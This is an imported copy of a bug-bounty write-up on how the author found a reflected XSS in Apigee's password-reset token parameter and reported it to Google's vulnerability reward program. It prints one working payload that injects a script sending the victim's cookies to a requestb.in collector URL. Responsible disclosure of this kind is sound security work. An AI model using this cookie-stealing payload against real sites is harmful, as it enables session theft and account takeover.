---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-05-06_google-acquisition-xss-apigee.md
original_filename: 2020-05-06_google-acquisition-xss-apigee.md
title: Google Acquisition XSS (Apigee)
category: documents
detected_topics:
- xss
- command-injection
- password-reset
- otp
tags:
- imported
- documents
- xss
- command-injection
- password-reset
- otp
language: en
raw_sha256: 3c46846260517bdf4b7447323df48f078d4c959dce91b4021875471ee5b00a2a
text_sha256: 290577f842bd4e4c83363d0f016c04412381f48cca2966cb2cd50edfd01e00c8
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Google Acquisition XSS (Apigee)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-05-06_google-acquisition-xss-apigee.md
- Source Type: markdown
- Detected Topics: xss, command-injection, password-reset, otp
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `3c46846260517bdf4b7447323df48f078d4c959dce91b4021875471ee5b00a2a`
- Text SHA256: `290577f842bd4e4c83363d0f016c04412381f48cca2966cb2cd50edfd01e00c8`


## Content

---
title: "Google Acquisition XSS (Apigee)"
url: "https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4"
authors: ["TnMch (@TnMch_)"]
programs: ["Google"]
bugs: ["XSS"]
publication_date: "2020-05-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4604
scraped_via: "browseros"
---

# Google Acquisition XSS (Apigee)

Google Acquisition XSS (Apigee)
TnMch
Follow
2 min read
·
May 7, 2020

135

1

So when I was trying to verify some Google acquisition website

I enter apigee.com which provides API management, so as always I start my burp suite and I try to verify all the functions as possible,

On the first try, everything was secure and all my first test failed, but as a bug hunter it should not be 100% secure and nothing is safe, So I log out and start to check the login and register option, look all right here

at some point, I tried to check the password reset action, get a link in my email account that looks like this

Press enter or click to view image in full size
reset password email

link :

https://api.accounts.apigee.com/management/users/[REDACTED]/resetpw?token=ZW0tsHaU-REDACTED-eeTDi2YRIN1CICmFjOSSE2JvllO_-REDACTED-

Here, I have the idea to try to bypass the token and obtain a valid link for all users, which allows me to update any user password, but this failed too and can’t bypass it

Get TnMch’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

when I was trying to edit the link and change the token code, I saw something normal for me, it looks like this entry has not been filtered here, so I tried to send some XSS payload as a test.

Press enter or click to view image in full size
source code page
Press enter or click to view image in full size
XSS POC alert
Press enter or click to view image in full size
XSS change index page

And here where things begin 😃

let's steal some cookies 😍

as it's not legal to hack someone account, I tested in my own account

create first the payload :

https://api.accounts.apigee.com/management/users/xxxxxx/resetpw?token=xxxxxxx"><script>new Image().src=’https://requestb.in/xxxxxx?code='+document.cookie</script><a href=”

ON CLICK & All cookies will be sent to us😅

request in requestb.in

Report time, I submitted this using their VRP program. I got the following mail

Press enter or click to view image in full size

Jul 11, 2017: “Nice catch!” answer 😍 love these words
